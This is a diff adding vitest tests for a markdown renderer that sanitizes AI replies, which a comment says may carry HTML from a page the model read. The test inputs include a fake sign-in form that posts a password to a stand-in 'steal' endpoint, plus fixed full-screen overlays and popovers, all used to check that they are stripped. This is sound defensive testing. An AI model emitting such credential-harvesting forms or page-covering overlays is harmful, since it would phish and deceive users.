@@ -1,3 +1,4 @@
+import { readFileSync } from "node:fs";
 import { describe, expect, it, vi } from "vitest";
 
 vi.mock("shiki", () => ({
@@ -390,6 +391,144 @@ describe("Markdown Rendering Service", () => {
 		expect(html).toContain("<th>Name</th>");
 		expect(html).toContain("<td>Alpha</td>");
 		expect(html).toMatch(/<\/table>\s*<\/div>/);
+	});
+});
+
+describe("renderMarkdown keeps a reply's markup inert", () => {
+	// A reply can have come from a page the model read. Its raw HTML may not ask for a
+	// password, cover the page or borrow the app's utility classes; everything the
+	// renderer writes itself must come through the same gate exactly as it did.
+	it("drops a form, a fixed overlay and the app's utility classes from raw HTML", async () => {
+		const mod = await import("./markdown");
+		const html = await mod.renderMarkdown(
+			[
+				"Hello there.",
+				"",
+				'<form action="https://x.test/steal" method="post"><input type="password" name="pw"><button>Sign in</button></form>',
+				"",
+				'<div style="position:fixed;inset:0;z-index:9999;background:red;color:red">cover</div>',
+				"",
+				'<div class="fixed inset-0 z-50 bg-black">cover two</div>',
+				"",
+				'<dialog open>modal</dialog> <span popover>pop</span> <span popovertarget="x">open</span>',
+			].join("\n"),
+			false,
+		);
+
+		expect(html).not.toMatch(
+			/<form|<input|<button|<dialog|popover|position|fixed|inset|z-50|z-index|x\.test/i,
+		);
+		expect(html).toContain("Hello there.");
+		for (const text of ["cover", "cover two", "modal", "pop"]) {
+			expect(html).toContain(text);
+		}
+		// What survives of the styled box is the one property it may carry.
+		expect(html).toContain('<div style="color:red">cover</div>');
+	});
+
+	it("keeps every class and style the renderer writes itself", async () => {
+		const mod = await import("./markdown");
+		await mod.initHighlighter();
+		const html = await mod.renderMarkdown(
+			[
+				"---",
+				"title: Client Notes",
+				"---",
+				"",
+				"> [!WARNING] Careful",
+				"> Mind the gap.",
+				"",
+				"| Name | Value |",
+				"| --- | --- |",
+				"| Alpha | 1 |",
+				"",
+				"- [x] Done",
+				"- [ ] Open",
+				"",
+				"<details open><summary>More</summary>body</details>",
+				"",
+				"```ts",
+				"const answer: number = 42;",
+				"```",
+				"",
+				"See [Example Source](https://example.com/page).",
+			].join("\n"),
+			false,
+			{ compactExternalLinks: true },
+		);
+
+		for (const kept of [
+			'class="markdown-frontmatter"',
+			'class="markdown-frontmatter-row"',
+			'class="markdown-callout markdown-callout-warning"',
+			'class="markdown-callout-title"',
+			'class="markdown-callout-body"',
+			'class="markdown-table-wrap"',
+			'class="markdown-table"',
+			'<input checked="" disabled="" type="checkbox">',
+			'<input disabled="" type="checkbox">',
+			"<details open=",
+			"<summary>More</summary>",
+			'class="shiki github-light"',
+			'<span class="line">',
+			'class="source-link-chip"',
+			'class="source-link-chip__label"',
+			'class="source-link-chip__icon"',
+		]) {
+			expect(html, kept).toContain(kept);
+		}
+		// Shiki's colours are what its styles are for.
+		expect(html).toMatch(/<span style="color:#[0-9A-Fa-f]{6}">/);
+		expect(html).toMatch(
+			/<pre class="shiki github-light" style="[^"]*background-color:#/,
+		);
+	});
+
+	it("lists every class the renderer's own source writes, so none is stripped from its own markup", async () => {
+		const mod = await import("./markdown");
+		// The code only: a comment may quote a class attribute while it explains one.
+		const source = readFileSync(
+			`${process.cwd()}/src/lib/services/markdown.ts`,
+			"utf-8",
+		).replace(/^\s*\/\/.*$/gm, "");
+		const written = new Set<string>();
+		for (const match of source.matchAll(/class="([^"]+)"/g)) {
+			for (const name of match[1].split(/\s+/)) {
+				// A name built from the model's word (`markdown-callout-${type}`) is the
+				// callout's, and has its own pattern.
+				if (!name.includes("$")) written.add(name);
+			}
+		}
+		expect(written.size).toBeGreaterThan(10);
+		for (const name of written) {
+			const html = await mod.renderMarkdown(
+				`<div class="${name}">x</div>`,
+				false,
+			);
+			expect(html, name).toContain(`class="${name}"`);
+		}
+	});
+
+	it("keeps a callout type's own class and nothing a reply could borrow in it", async () => {
+		const mod = await import("./markdown");
+		const html = await mod.renderMarkdown(
+			'> [!tip] Hint\n> Try it.\n\n<aside class="markdown-callout-x fixed inset-0">y</aside>',
+			false,
+		);
+		expect(html).toContain("markdown-callout markdown-callout-tip");
+		expect(html).toContain('class="markdown-callout-x"');
+		expect(html).not.toMatch(/fixed|inset/);
+	});
+
+	it("is the same for a checklist item's inline markdown", async () => {
+		const mod = await import("./markdown");
+		const html = await mod.renderInlineMarkdown(
+			'buy <button>now</button> <span class="fixed inset-0" style="position:fixed">milk</span>',
+			false,
+		);
+		expect(html).not.toMatch(/<button|fixed|inset|position|style=|class=/i);
+		expect(html).toContain("now");
+		expect(html).toContain("milk");
 	});
 });
 
